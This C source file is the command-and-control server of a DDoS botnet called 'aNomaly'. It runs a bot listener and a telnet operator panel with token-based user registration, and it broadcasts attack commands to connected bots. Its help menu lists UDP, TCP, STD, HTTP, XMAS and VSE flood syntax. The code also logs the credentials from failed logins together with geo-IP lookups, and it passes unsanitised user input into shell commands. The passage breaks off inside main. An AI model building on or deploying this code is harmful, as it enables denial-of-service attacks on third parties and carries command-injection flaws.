/* 
	             aNomaly CnC
	
	register tokens go into tokens.txt 
	token can only be used once then it will be removed!!
	to give user admin, simply add admin to there name in logins.txt
	user pass admin
	enjoy!
	
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>

#define MAXFDS 1000000

int prevstat;
int attackcount;
const char* gayd()
{
FILE *dat;
  char datee[1024];
  char *dd[1024];
 dat = popen("date +%F", "r");
 fgets(datee, sizeof(datee)-1, dat); 
 pclose(dat);
 strcpy(dd,datee);
 return dd;
}
struct account {
char id[200];
char password[200];
char prev[100];
};
struct iplogger {
    int socket;
    char ipi[100];
};
static struct account accounts[10]; //max users is set on 10

struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
} clients[MAXFDS];
struct telnetdata_t {
        int connected;
} managements[MAXFDS];

////////////////////////////////////
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}

static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "STOP USING IRELIVANT PORTS\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {
                        send(i, "\x1b[1;35m", 9, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, ": \n", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n:", 2, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
		yeet:
        free(wot);
		
}
void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  
                                                if(send(infd, "nodups\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
												printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] %s\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
                                        close(thefd);
                                }
                        }
                }
        }
}

unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total*1;
}
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; [+] Loaded: %d | aNomaly | Users: %d [+]%c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return;
                usleep(700000);
        }
}
 
int Search_in_File(char *filen, char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[1024]; 

    if((fp = fopen(filen, "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}

 void client_addr(struct sockaddr_in addr){
	 FILE *cmd;
  char output[1024];
  char yi[512];
 
 sprintf(yi,"wget ipinfo.io/%d.%d.%d.%d/country -qO-",
         addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);	
 cmd = popen(yi, "r");
 fgets(output, sizeof(output)-1, cmd);
 
 FILE *cmd1;
  char output1[1024];
  char yi1[512];
 
 sprintf(yi1,"wget ipinfo.io/%d.%d.%d.%d/org -qO-",
         addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
 cmd1 = popen(yi1, "r");
 fgets(output1, sizeof(output1)-1, cmd1);
 
        printf("\x1b[1;37m%d.%d.%d.%d\n\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mcountry: %s\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37misp/asn: %s\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24, output, output1);
}
char* geoisp(char *ipp)
{
	FILE *cmd12;
  char output12[1024];
  char yi12[512];
 
 sprintf(yi12,"wget ipinfo.io/%s/org -qO-",ipp);
 cmd12 = popen(yi12, "r");
 fgets(output12, sizeof(output12)-1, cmd12);
pclose(cmd12);

char *coo = output12;

return coo;
}
char* geoc(char *ippp)
{
	FILE *cmd13;
  char output13[1024];
  char yi13[512];
 
 sprintf(yi13,"wget ipinfo.io/%s/country -qO-",ippp);
 cmd13 = popen(yi13, "r");
 fgets(output13, sizeof(output13)-1, cmd13); 
 pclose(cmd13);
 
char* cp = output13;

 return cp;
}

int resolvehttp(char *  , char *);
int resolvehttp(char * site , char* ip)
{
    struct hostent *he;
    struct in_addr **addr_list;
    int i;

    if ( (he = gethostbyname( site ) ) == NULL)
    {
        // get the host info
        herror("gethostbyname");
        return 1;
    }

    addr_list = (struct in_addr **) he->h_addr_list;

    for(i = 0; addr_list[i] != NULL; i++)
    {
        //Return the first one;
        strcpy(ip , inet_ntoa(*addr_list[i]) );
        return 0;
    }

    return 1;
}
void *telnetWorker(void *lang)
{
	    struct iplogger *loli = lang;
		char country[100];
		char isp[100];
        char usernamez[80];
        int thefd = (int)loli->socket;
		char ipl[100];
		strcpy(ipl,loli->ipi);
        int find_line;
		managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
		//char buffer[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
		//memset(buffer, 0, sizeof buffer);
        char botnet[2048];
        memset(botnet, 0, 2048);
        
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("logins.txt", "r"); 
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
		if(send(thefd, "\x1b[1;37mLogin or Register?\x1b[1;31m: \x1b[1;37m",42,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
		trim(buf);
		
		int output;
		int output1;
		output = strcmp(buf,"login");
		output1 = strcmp(buf,"register");
		
		if(output == 0)
		{
		login:
		while(j!=i-1) 
        {
            fscanf(fp, "%s %s %s", accounts[j].id, accounts[j].password, accounts[j].prev);
            ++j;
        }
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\x1b[1;37mUsername\x1b[1;31m: \x1b[1;37m",32,MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		char iffailedu[1024];
		strcpy(iffailedu,buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File("logins.txt",nickstring);
		//if(strcmp(buf, accounts[find_line].id) == 0){
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[1;37mPassword\x1b[1;31m: \x1b[1;37m",32,MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
		trim(buf);
		char iffailedp[1024];
		strcpy(iffailedp,buf);
        if(strcmp(iffailedp, accounts[find_line].password) != 0 || strcmp(iffailedu, accounts[find_line].id) != 0) goto failed;
		if(strcmp(iffailedp, accounts[find_line].password) == 0 || strcmp(iffailedu,accounts[find_line].id) == 0)
		{
		if(send(thefd, "\r\n\x1b[1;31m[\x1b[1;37mcreds are valid logging you in now\x1b[1;31m]", 62, MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		}

        memset(buf, 0, 2048);
        goto fak;
		//}
		failed:
		strcpy(country,geoc(ipl));
		strcpy(isp,geoisp(ipl));
		printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mfailed login atempt with cred --> %s:%s \n\x1b[1;31m[\x1b[1;32mvictems geo\x1b[1;31m] \n\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mip --> %s \n\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37mcountry --> %s\x1b[1;31m[\x1b[1;32m+\x1b[1;31m] \x1b[1;37misp --> %s\n",iffailedu,iffailedp,ipl,country,isp);
		char flog[1024];
		sprintf(flog,"echo \"<----------------------->\ndate: %sfailed login with cred --> %s:%s \n[victems geo] \nip --> %s \ncountry --> %sisp --> %s<----------------------->\" >> failed.txt",gayd(),iffailedu,iffailedp,ipl,country,isp);
		system(flog);
		memset(iffailedu,0,sizeof(iffailedu));
		memset(iffailedp,0,sizeof(iffailedp));
		
        if(send(thefd, "\r\n\x1b[1;31m[\x1b[1;37minvalid creds gtfo!\x1b[1;31m]", 47, MSG_NOSIGNAL) == -1) goto end;
           sleep(2);
        goto end;
		}
	
	    if(output1 == 0)
		{
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof buf);
		if(send(thefd, "\x1b[1;37mToken\x1b[1;31m: \x1b[1;37m",29,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		int find_tok;
		int readme;
		char findme[1024];
        find_tok = open("tokens.txt", O_RDONLY);
	    readme = read(find_tok,findme,sizeof(findme));
		
		if(strcmp(findme, buf) == 0)
		{
		if(send(thefd, "\r\n\x1b[1;31m[\x1b[1;37mToken redeemed successfully\x1b[1;31m]\x1b[1;37m",54,MSG_NOSIGNAL) == -1) goto end;
		sleep(1);
		char tokrev[1024];
		sprintf(tokrev,"sed -i '/%s/d' tokens.txt",buf);
		system(tokrev);
		}
		else
		{
		if(send(thefd, "\r\n\x1b[1;31m[\x1b[1;37mToken is invaild\x1b[1;31m]\x1b[1;37m",45,MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto end;
		}
		
		tryagain:
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
		if(send(thefd, "\x1b[1;37mnew username\x1b[1;31m: \x1b[1;37m",40,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		char usernamee[1024];
		strcpy(usernamee,buf);
		memset(buf,0,sizeof(buf));
		if(send(thefd, "\x1b[1;37mnew password\x1b[1;31m: \x1b[1;37m",40,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		char passwordd[1024];
		strcpy(passwordd,buf);
		if(send(thefd, "\x1b[1;31m[\x1b[1;37msucessfully added login please try to login now\x1b[1;31m]\x1b[1;37m",71,MSG_NOSIGNAL) == -1) goto end;
		sleep(3);
		
		char buff[2048];
		char put[1024];
		sprintf(put,"%s %s notadmin",usernamee,passwordd);
		system("echo "" >> logins.txt");
		sprintf(buff,"echo %s >> logins.txt",put);
		system(buff);
		close(find_tok);
		memset(buff,0,sizeof(buff));
		goto login;
		}
	
	    if(output != 0 || output1 != 0)
		{
		if(send(thefd, "\x1b[1;31m[\x1b[1;37mwrong input please try again\x1b[1;31m]\x1b[1;37m",52,MSG_NOSIGNAL) == -1) goto end;
		sleep(2);
		goto end;
		}	
		
        fak:

        Title:
        pthread_create(&title, NULL, &titleWriter, thefd);
		char bashline[1024];
		sprintf(bashline,"\x1b[37;1m\x1b[31m[\x1b[37;1m%s\x1b[31m@\x1b[37;1maNomaly\x1b[31m]\x1b[36;1m: \x1b[0m",accounts[find_line].id);
        while(1) {
        if(send(thefd, bashline, strlen(bashline), MSG_NOSIGNAL) == -1) goto end;
        break;
        }
        pthread_create(&title, NULL, &titleWriter, thefd);
        managements[thefd].connected = 1;
        
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {

        if(strstr(buf, "HELP") || strstr(buf, "help")) 
        {           
            sprintf(botnet, "\x1b[0m- \x1b[31mUDP Flood \x1b[0m- \e[0m!* UDP [TARGET] [PORT] [TIME] 32 0 10\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0m- \x1b[31mTCP Flood \x1b[0m- \e[0m!* TCP [TARGET] [PORT] [TIME] 32 [FLAGS(all)] 0 10\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0m- \x1b[31mSTD Flood \x1b[0m- \e[0m!* STD [TARGET] [PORT] [TIME]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0m- \x1b[31mHTTP Flood\x1b[0m- \e[0m!* HTTP [URL] [PORT] [TIME] [THREADS] [METHOD]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0m- \x1b[31mXMAS Flood\x1b[0m- \e[0m!* XMAS [TARGET] [PORT] [TIME] 32 1024 10\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);         
            sprintf(botnet, "\x1b[0m- \x1b[31mVSE Flood\x1b[0m- \e[0m!* VSE [TARGET] [PORT] [TIME] 32 1024 10\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
			sprintf(botnet, "\x1b[0m- \x1b[31mResolver \x1b[0m- \e[0mresolve [domain]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
			sprintf(botnet, "\x1b[0m- \x1b[31mgeoip \x1b[0m- \e[0mLooks Up IP\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
			sprintf(botnet, "\x1b[0m- \x1b[31madmin \x1b[0m- \e[0mShows Admin cmds\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
						sprintf(botnet, "\x1b[0m- \x1b[31mstats \x1b[0m- \e[0mShows stats\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
									sprintf(botnet, "\x1b[0m- \x1b[31mclear \x1b[0m- \e[0mClears screen\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
												sprintf(botnet, "\x1b[0m- \x1b[31mbots \x1b[0m- \e[0mchecks bot count\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        }
		else if(strstr(buf, "bots"))
        {
            memset(buf, 0, sizeof buf);
            sprintf(botnet, "\e[0;31maNomaly\e[0;36m.\e[0;31mUsers \e[0;31m[\e[0;36m%d\e[0;31m]\r\n\e[0;31mTotal\e[0;36m.\e[0;31mBots \e[0;31m[\e[0;36m%d\e[0;31m]\r\n\x1b[37m\e[1;33m", managesConnected, clientsConnected());
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;

        }
		if(strstr(buf, "stats"))
        {
            sprintf(botnet, "Attacks Sent: [%d]\r\n", attackcount);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            memset(buf, 0, sizeof buf);
        }
		
		if(strstr(buf, "STD") || strstr(buf, "UDP") || strstr(buf, "TCP") || strstr(buf, "HTTP") || strstr(buf, "VSE") || strstr(buf, "XMAS"))
        {
            attackcount++;
            sprintf(botnet, "Succesfully Sent Attack!\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		
		if(strstr(buf, "admin") || strstr(buf, "ADMIN")) 
        {           
            sprintf(botnet, "\x1b[0m- \x1b[31madduser \x1b[0m- \e[0madds a user\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1b[0m- \x1b[31mrmuser \x1b[0m- \e[0mrmuser [username]\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
			
			
		if(strstr(buf, "geoip")){
        char r_banner2  [512];
		char r_banner3  [512];
		
		memset(buf,0,sizeof(buf));
        if(send(thefd, "\x1b[1;37mip: \x1b[1;37m",19,MSG_NOSIGNAL) == -1) goto end;
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		char geoi[100];
		char geocc[100];
		strcpy(geoi,geoisp(buf));
		strcpy(geocc,geoc(buf));
 
		sprintf(r_banner2,"\x1b[1;35mcountry\x1b[1;37m: %s\r",geocc);
		sprintf(r_banner3,"\x1b[1;35misp/asn\x1b[1;37m: %s\r",geoi);
		
		if(send(thefd, r_banner2, strlen(r_banner2), MSG_NOSIGNAL) == -1) return;
		if(send(thefd, r_banner3, strlen(r_banner3), MSG_NOSIGNAL) == -1) return;
        }
		
		
		
		if(strstr(buf, "adduser"))
		{
		if(!strcmp(accounts[find_line].prev, "admin"))
		{
		buby:
		if(send(thefd, "\x1b[1;37mnew username\x1b[1;31m: \x1b[1;37m",40,MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		if(strlen(buf) < 1)
		{
		if(send(thefd, "\x1b[1;37mplease input a username not nothing lol\x1b[1;37m\r\n",60,MSG_NOSIGNAL) == -1) goto end;
		goto buby;
		}
		char usernamee[1024];
		strcpy(usernamee,buf);
		if(strstr(buf,accounts[find_line].id) != 0)
		{
		if(send(thefd, "\x1b[1;37musername all ready exist please try another username\x1b[1;37m\r\n",69,MSG_NOSIGNAL) == -1) goto end;
		goto buby;
		}
		duby:
		if(send(thefd, "\x1b[1;37mnew password\x1b[1;31m: \x1b[1;37m",40,MSG_NOSIGNAL) == -1) goto end;
		memset(buf,0,sizeof(buf));
		if(fdgets(buf, sizeof(buf), thefd) < 1) goto end;
		trim(buf);
		if(strlen(buf) < 1)
		{
		if(send(thefd, "\x1b[1;37mplease input a password not nothing lol\x1b[1;37m\r\n",60,MSG_NOSIGNAL) == -1) goto end;
		goto duby;
		}
		char passwordd[1024];
		strcpy(passwordd,buf);
		memset(buf,0,sizeof(buf));
		if(send(thefd, "\x1b[1;37msucessfully added login\x1b[1;37m\r\n",40,MSG_NOSIGNAL) == -1) goto end;
		char bufff[2048];
		char putt[1024];
		sprintf(putt,"%s %s notadmin",usernamee,passwordd);
		system("echo "" >> logins.txt");
		sprintf(bufff,"echo %s >> logins.txt",putt);
		system(bufff);
		memset(bufff,0,sizeof(bufff));
		}
		else
		{
		char den[512];
		sprintf(den,"\x1b[1;37myou dont have prev to access this cmd.\r\n");
		if(send(thefd, den, strlen(den), MSG_NOSIGNAL) == -1) return;
		}
		}
		
		else if(strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
        {
            char *ip[100];
            char *token = strtok(buf, " ");
            char *url = token+sizeof(token);
            trim(url);
            resolvehttp(url, ip);
            printf("\x1b[1;33m[\x1b[1;36mResolver\x1b[1;33m] \x1b[1;36m%s -> %s\n", url, ip);
            sprintf(botnet, "\x1b[1;33m[\x1b[1;36mResolver\x1b[1;33m] \x1b[1;36m%s -> %s\r\n", url, ip);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
	if(strcmp)
		
		if(strstr(buf, "rmuser"))
		{
		if(!strcmp(accounts[find_line].prev, "admin"))
		{
			char allow[512];
			char sys[1024];
			char *strings = strtok(buf, " ");
			char *user = strings+sizeof(strings);
			trim(user);
			sprintf(sys,"sed -i '/%s/d' logins.txt\n",user);
			system(sys);
			sprintf(allow,"\x1b[1;37muser has been removed.\r\n");
			if(send(thefd, allow, strlen(allow), MSG_NOSIGNAL) == -1) return;
		}
		else
		{
			char den[512];
		sprintf(den,"\x1b[1;37myou dont have prev to access this cmd.\r\n");
		if(send(thefd, den, strlen(den), MSG_NOSIGNAL) == -1) return;
		}
		}
        if(strstr(buf, "clear")){
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        managements[thefd].connected = 1;
        }
                trim(buf);
                if(send(thefd, bashline, strlen(bashline), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                if(strstr(buf, "lol") || strstr(buf, "lol"))
                {
                    continue;
                }
                else
                {
                    printf("[%s Said: \"%s\"]\n",usernamez, buf);
                    broadcast(buf, thefd, usernamez);
                    memset(buf, 0, 2048);
                }
        }
            broadcast(buf, thefd, usernamez);
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{    
        int sockfd, newsockfd;
        socklen_t clilen;
		static int st=0;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
 
        { 
		if(st == 1)
		{
		FILE *cmd;
  char output[1024];
  char yi[512];
 
 sprintf(yi,"wget ipinfo.io/%d.%d.%d.%d/country -qO-",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
 cmd = popen(yi, "r");
 fgets(output, sizeof(output)-1, cmd);
 FILE *cmd1;
  char output1[1024];
  char yi1[512];
 
 sprintf(yi1,"wget ipinfo.io/%d.%d.%d.%d/org -qO-",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
 cmd1 = popen(yi1, "r");
 fgets(output1, sizeof(output1)-1, cmd1);
 
         		printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m]\x1b[1;37m client is logging in\n");
				printf("\x1b[1;31m[\x1b[1;32m+\x1b[1;31m]\x1b[1;37m IP: ");
                client_addr(cli_addr);
                FILE *logFile;
                logFile = fopen("ip.log", "a");
                fprintf(logFile, "\n<---------------------------->\ndate: %sip: %d.%d.%d.%d\ncountry: %sisp/asn: %s<---------------------------->", gayd(), cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24,output,output1);
                fclose(logFile);
				pclose(cmd);
                pclose(cmd1);	
		}
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
				
			struct iplogger loli;
			loli.socket = newsockfd;
			char tt[100];
			sprintf(tt,"%d.%d.%d.%d",cli_addr.sin_addr.s_addr & 0xFF, (cli_addr.sin_addr.s_addr & 0xFF00)>>8, (cli_addr.sin_addr.s_addr & 0xFF0000)>>16, (cli_addr.sin_addr.s_addr & 0xFF000000)>>24);
		    strcpy(loli.ipi,tt);
                pthread_t thread;
        pthread_create( &thread, NULL, &telnetWorker, (void *)&loli);
		st=1;
		}
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); 
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [bot-port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        printf("aNomaly CNC Started!! \n");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); 
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); 
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); 
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); 
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL);
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
		while(1)
        {
                broadcast("PING", -1, "PUV");
